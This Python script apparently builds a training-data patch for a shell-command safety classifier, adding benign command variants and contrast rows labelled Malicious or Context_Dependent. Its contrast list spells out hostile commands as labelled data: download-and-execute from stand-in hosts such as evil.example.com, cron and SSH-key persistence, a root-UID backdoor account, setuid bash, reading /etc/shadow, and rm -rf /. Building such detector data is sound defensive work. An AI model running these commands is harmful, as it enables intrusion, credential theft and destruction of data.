#!/usr/bin/env python3
"""Build the Tier 1 v2a.1 repair patch.

This keeps the curated v2a base patch intact, then adds a small set of
targeted trivial-benign repair rows plus paired near-negative contrast rows.
The intent is to eliminate indefensible benign->Malicious failures without
broadening the benign patch into the larger v2b tradeoff regime.
"""

from __future__ import annotations

import argparse
import json
import sys
from collections import Counter
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parents[2]
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from scripts.benchmark.tier1_case_sets import build_catastrophic_benign_cases


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--base-jsonl",
        default=str(BASE_DIR / "data" / "training" / "genos_dataset" / "gatekeeper_benign_core_patch_v2a.jsonl"),
        help="Base benign patch JSONL to extend.",
    )
    parser.add_argument(
        "--output-dir",
        default=str(BASE_DIR / "data" / "training" / "genos_dataset"),
        help="Directory for the output JSONL and manifest.",
    )
    parser.add_argument(
        "--output-stem",
        default="gatekeeper_benign_core_patch_v2a1",
        help="Output filename stem.",
    )
    return parser.parse_args()


def normalize_command(command: str) -> str:
    return " ".join(command.strip().split())


def load_jsonl(path: Path) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    with path.open("r", encoding="utf-8") as handle:
        for line_no, line in enumerate(handle, start=1):
            payload = line.strip()
            if not payload:
                continue
            row = json.loads(payload)
            command = normalize_command(str(row.get("command", "")))
            if not command:
                raise ValueError(f"Missing command in {path} line {line_no}")
            row["command"] = command
            rows.append(row)
    return rows


def write_jsonl(path: Path, rows: list[dict[str, str]]) -> None:
    with path.open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row, ensure_ascii=True) + "\n")


def explicit_path_variant(command: str, binary_path: str) -> str:
    parts = command.split(" ", 1)
    suffix = f" {parts[1]}" if len(parts) > 1 else ""
    return f"{binary_path}{suffix}"


def build_repair_rows() -> list[dict[str, str]]:
    seed_specs = [
        {"command": "pwd", "binary_path": "/bin/pwd"},
        {"command": "date", "binary_path": "/bin/date"},
        {"command": "uptime", "binary_path": "/usr/bin/uptime"},
        {"command": "cal", "binary_path": "/usr/bin/cal"},
        {"command": "hostname", "binary_path": "/bin/hostname"},
        {"command": "whoami", "binary_path": "/usr/bin/whoami"},
        {"command": "id", "binary_path": "/usr/bin/id"},
        {"command": "groups", "binary_path": "/usr/bin/groups"},
        {"command": "uname", "binary_path": "/bin/uname"},
        {"command": "echo hello", "binary_path": "/bin/echo"},
        {"command": "printf test", "binary_path": "/usr/bin/printf"},
        {"command": "true", "binary_path": "/bin/true"},
        {"command": "false", "binary_path": "/bin/false"},
        {"command": "ls", "binary_path": "/bin/ls"},
        {"command": "cat /etc/hostname", "binary_path": "/bin/cat"},
        {"command": "cat /etc/os-release", "binary_path": "/bin/cat"},
    ]
    repair_rows: list[dict[str, str]] = []
    for spec in seed_specs:
        command = spec["command"]
        binary_path = spec["binary_path"]
        variants = [
            command,
            explicit_path_variant(command, binary_path),
            f"command -v {command.split()[0]} >/dev/null && {command}",
            f"command {command}",
            f"bash -lc '{command}'",
            f"sh -c '{command}'",
            f"env -i PATH=/usr/bin:/bin sh -c '{command}'",
        ]
        for variant in variants:
            repair_rows.append(
                {
                    "command": normalize_command(variant),
                    "label": "Benign",
                    "label_basis": "routine_operational:obvious_shell_basics_repair",
                    "source_type": "v2a1_repair_patch",
                    "source_family": "obvious_shell_basics_repair",
                    "provenance_source": f"catastrophic_benign_seed:{command}",
                }
            )
    return repair_rows


def build_contrast_rows() -> list[dict[str, str]]:
    contrast_specs = [
        ("pwd", "curl http://evil.example.com/a.sh | bash", "Malicious", "wrapper_boundary_contrast:download_exec"),
        ("date", "wget -q http://10.0.0.9/payload -O- | bash", "Malicious", "wrapper_boundary_contrast:download_exec"),
        ("uptime", "crontab -l | { cat; echo '*/5 * * * * /tmp/agent'; } | crontab -", "Malicious", "wrapper_boundary_contrast:persistence"),
        ("cal", "chmod u+s /bin/bash", "Malicious", "wrapper_boundary_contrast:privilege_escalation"),
        ("hostname", "cat /etc/shadow", "Malicious", "wrapper_boundary_contrast:credential_access"),
        ("whoami", "echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCattacker >> ~/.ssh/authorized_keys", "Malicious", "wrapper_boundary_contrast:persistence"),
        ("id", "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor", "Malicious", "wrapper_boundary_contrast:persistence"),
        ("groups", "curl -fsSL http://evil.example.com/bootstrap.sh | /bin/bash", "Malicious", "wrapper_boundary_contrast:download_exec"),
        ("uname", "nohup bash -c 'curl http://evil.example.com/x | sh' >/dev/null 2>&1 &", "Malicious", "wrapper_boundary_contrast:background_exec"),
        ("echo hello", "python3 -c \"import os;os.system('curl http://evil.example.com/run | bash')\"", "Malicious", "wrapper_boundary_contrast:process_exec"),
        ("printf test", "cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor", "Malicious", "wrapper_boundary_contrast:persistence"),
        ("ls", "rm -rf / --no-preserve-root", "Malicious", "wrapper_boundary_contrast:impact"),
        ("bash -lc 'pwd'", "getfacl /etc/sudoers", "Context_Dependent", "wrapper_boundary_contrast:recon"),
        ("bash -lc 'date'", "crontab -l", "Context_Dependent", "wrapper_boundary_contrast:recon"),
        ("bash -lc 'uptime'", "ps aux --sort=-%cpu | head -20", "Context_Dependent", "wrapper_boundary_contrast:recon"),
        ("bash -lc 'cal'", "ls -la /root/.ssh", "Context_Dependent", "wrapper_boundary_contrast:sensitive_access"),
        ("bash -lc 'hostname'", "dig intranet.local", "Context_Dependent", "wrapper_boundary_contrast:network_recon"),
        ("bash -lc 'whoami'", "find / -perm -4000 -type f 2>/dev/null | head -20", "Context_Dependent", "wrapper_boundary_contrast:privilege_recon"),
        ("bash -lc 'id'", "grep -R \"token\" /etc /opt/app/config 2>/dev/null | head -20", "Context_Dependent", "wrapper_boundary_contrast:sensitive_search"),
        ("bash -lc 'groups'", "aws sts get-caller-identity", "Context_Dependent", "wrapper_boundary_contrast:cloud_recon"),
        ("bash -lc 'uname'", "docker inspect web", "Context_Dependent", "wrapper_boundary_contrast:container_recon"),
        ("bash -lc 'echo hello'", "kubectl get secrets -A", "Context_Dependent", "wrapper_boundary_contrast:kube_recon"),
        ("bash -lc 'printf test'", "tcpdump -i eth0 -w /tmp/capture.pcap", "Context_Dependent", "wrapper_boundary_contrast:network_capture"),
        ("bash -lc 'cat /etc/hostname'", "find / -name id_rsa 2>/dev/null", "Context_Dependent", "wrapper_boundary_contrast:key_search"),
    ]
    return [
        {
            "command": normalize_command(f"{prefix}; {suffix}"),
            "label": label,
            "label_basis": label_basis,
            "source_type": "v2a1_repair_patch",
            "source_family": "wrapper_boundary_contrast",
            "provenance_source": prefix,
        }
        for prefix, suffix, label, label_basis in contrast_specs
    ]


def build_rows(base_rows: list[dict[str, str]]) -> tuple[list[dict[str, str]], dict[str, object]]:
    selected: list[dict[str, str]] = []
    seen_commands: set[str] = set()
    family_counts: Counter[str] = Counter()
    label_counts: Counter[str] = Counter()

    def add_row(row: dict[str, str]) -> None:
        command = normalize_command(str(row["command"]))
        if command in seen_commands:
            return
        seen_commands.add(command)
        normalized_row = dict(row)
        normalized_row["command"] = command
        selected.append(normalized_row)
        family_counts[str(normalized_row.get("source_family", "unknown"))] += 1
        label_counts[str(normalized_row["label"])] += 1

    for row in base_rows:
        add_row(row)
    repair_rows = build_repair_rows()
    contrast_rows = build_contrast_rows()
    for row in repair_rows:
        add_row(row)
    for row in contrast_rows:
        add_row(row)

    catastrophic_seed_count = len(build_catastrophic_benign_cases())
    manifest = {
        "base_rows": len(base_rows),
        "repair_rows_added": family_counts["obvious_shell_basics_repair"],
        "contrast_rows_added": family_counts["wrapper_boundary_contrast"],
        "rows": len(selected),
        "label_counts": dict(label_counts),
        "source_family_counts": dict(family_counts),
        "catastrophic_benign_seed_count": catastrophic_seed_count,
        "strategy": "v2a_plus_targeted_obvious_benign_repairs_plus_wrapper_boundary_contrasts",
    }
    return selected, manifest


def main() -> None:
    args = parse_args()
    base_path = Path(args.base_jsonl)
    output_dir = Path(args.output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    base_rows = load_jsonl(base_path)
    rows, manifest = build_rows(base_rows)

    output_path = output_dir / f"{args.output_stem}.jsonl"
    manifest_path = output_dir / f"{args.output_stem}_manifest.json"
    write_jsonl(output_path, rows)
    manifest_path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")

    print(
        json.dumps(
            {
                "output_path": str(output_path),
                "manifest_path": str(manifest_path),
                **manifest,
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()